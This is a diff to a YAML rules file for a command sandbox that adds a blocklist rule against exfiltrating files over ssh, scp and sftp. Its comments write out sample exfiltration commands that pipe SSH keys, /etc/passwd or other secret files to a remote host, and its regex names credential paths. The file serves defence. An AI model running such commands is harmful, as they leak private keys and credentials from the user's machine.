@@ -3,8 +3,8 @@
 # ~/.config/terminal-jail/rules.d/00-builtins.yaml (user rules dir the engine
 # loads); root-managed deployments may place it in /etc/terminal-jail/rules.d/.
 # Priority 1000 = critical blocklist, 700 = auto-sandbox, 500 = always-allow
-# These reflect the same 54 rules hardcoded in the Python engine
-# (35 blocklist / 9 sandbox / 10 allow). Rule ids AND pattern strings must stay
+# These reflect the same 55 rules hardcoded in the Python engine
+# (36 blocklist / 9 sandbox / 10 allow). Rule ids AND pattern strings must stay
 # byte-identical to the engine constants: install.sh copies this file into the
 # user rules dir, where same-id override REPLACES the builtin.
 
@@ -339,6 +339,58 @@ rules:
       # duplications excluded); `/dev/null` and `/dev/stdin` sources excluded,
       # so `nc host port < /dev/null` keeps its ALLOW verdict.
       pattern: "(?<![\\w.-])(?:nc|ncat|netcat|socat)\\s[^|;&]*(?<!<)<(?!<|&)\\s*(?!/dev/(?:null|stdin)(?![\\w.-]))\\S"
+
+  # ---------------------------------------------------------------------------
+  # DF-TERMINAL-JAIL-30 ssh/scp/sftp-transport exfiltration. Sibling of the
+  # raw-socket rules above, found in the same run: a local-file reader piped
+  # into ssh as the network client was a plain ALLOW while
+  # `cat <file> | nc <host>` blocks (and the nc rule's own message names ssh
+  # as deliberately excluded). Same mechanism as builtin-net-file-exfil-pipe:
+  # a BLOCK rule in the blocklist layer, so the decider's whole-command pass
+  # settles it before any per-segment layer — including `allow-cat-safe` on
+  # the reader segment.
+  # ---------------------------------------------------------------------------
+  - id: "builtin-net-file-exfil-ssh"
+    description: "Local-file reader piped into an ssh/scp/sftp transport, or an ssh/scp/sftp fed a secret local file by an input redirect (file exfiltration over ssh)"
+    priority: 1000
+    action: block
+    block_message: "ssh-transport file exfiltration is blocked: a local-file reader (cat, dd, tar, gzip, base64, xxd, od, strings) piped into ssh/scp/sftp, or ssh/scp/sftp fed a secret-bearing local file (`~`, `.ssh`/`.gnupg`/`.aws`/`.config`/`.env`, id_rsa/id_ed25519/known_hosts/credentials) by an input redirect. The rule matches the TRANSPORT, not the remote command — `reader | ssh ...` blocks regardless of what the remote side does, including the backup form `tar czf - dir | ssh host 'cat > backup.tgz'` (override to warn level with a same-id user rule in `~/.config/terminal-jail/rules.d/` if a reader-pipe-over-ssh workflow needs it). Plain ssh, tunnels, remote reads (`ssh host uptime`), `git push`, local `tar cf x.tar dir`, and local `tar | gzip` pipes keep their ALLOW verdict."
+    match:
+      type: pattern
+      # ARM 1 — the transport shape (mirrors builtin-net-file-exfil-pipe arm
+      # for arm, with the client set widened from the raw-socket binaries to
+      # the ssh family):
+      #   tar cf - ~/.ssh | ssh host 'cat > /tmp/x'
+      #   cat /etc/passwd | ssh host 'tee /tmp/x'
+      #   cat ~/.ssh/id_rsa | scp - host:/tmp/x
+      #   tar cf - ~/.ssh | sftp host
+      # The reader set, operand requirement, chain-stopping `[^|;&]` stage
+      # gap, tolerated `2>&1` fd merge, `{0,3}` intermediate-pipe budget and
+      # word boundaries are byte-identical to the raw-socket rule — only
+      # `(?:nc|ncat|netcat|socat)` became `(?:ssh|scp|sftp)` (optionally
+      # path-qualified). The remote command text is deliberately NOT
+      # inspected: `scp -` and `sftp` carry no remote command at all, and
+      # `ssh host tee` versus `ssh host wc -l` differ only by the source
+      # path — the same shape-not-secret call the raw-socket family makes
+      # (it also fires on non-secret files). Consequence, deliberate and
+      # documented: the former ALLOW-pinned backup form
+      # `tar czf - /srv/data | ssh host 'cat > /srv/backup.tgz'` blocks
+      # too; override to warn for that workflow.
+      # ARM 2 — redirect-fed SECRET source (mirrors
+      # builtin-net-file-exfil-redirect, tightened to the DF-29
+      # secret-component set so an ordinary remote read that happens to
+      # contain `<` inside its quoted command keeps its ALLOW verdict):
+      #   ssh host 'cat > /tmp/x' < ~/.ssh/id_rsa
+      # The quote-aware gap lets the scan see past a quoted remote command
+      # to the LOCAL `<` redirect after it; the DF-29 secret-component
+      # alternatives (~, ~/.ssh/.gnupg/.aws/.config/.env,
+      # id_rsa/id_ed25519/known_hosts/credentials) are borrowed verbatim.
+      # The double quote is spelled `\x22` on purpose: this is a
+      # double-quoted YAML scalar, and a literal `"` here costs an escape
+      # level that silently drifts this pattern apart from the engine
+      # constant (caught by scripts/yaml-mirror-parity-probe.py). `\x22` is
+      # unambiguous in both formats and regex-identical to `"`.
+      pattern: "(?<![\\w.-])(?:cat|dd|tar|gzip|base64|xxd|od|strings)\\s+[^\\s|;&](?:(?:(?!&&)[^|;&]|(?<=\\d)>&?\\d)*\\|&?){0,3}(?:(?!&&)[^|;&]|(?<=\\d)>&?\\d)*(?<![\\w.-])(?:/usr/bin/|/usr/sbin/|/bin/)?(?:ssh|scp|sftp)\\s|(?<![\\w.-])(?:/usr/bin/|/usr/sbin/|/bin/)?(?:ssh|scp|sftp)\\s(?:(?:[^|;&\\x22']|'[^']*'|\\x22[^\\x22]*\\x22)*?)(?<!<)<(?!<|&)\\s*(?!/dev/(?:null|stdin)(?![\\w.-]))[^|;&]*(?:~(?![\\w./+-])|~/(?![\\w.])|/~?\\.(?:ssh|gnupg|aws|config|env)(?![\\w-])|(?<![\\w./+-=])\\.(?:ssh|gnupg|aws|config|env)(?![\\w-])|(?<![\\w])/?(?:id_rsa|id_ed25519|known_hosts|credentials)(?![\\w-]))"
 
   # ---------------------------------------------------------------------------
   # DF-TERMINAL-JAIL-17 interpreter egress. DF-TERMINAL-JAIL-16 blocked the
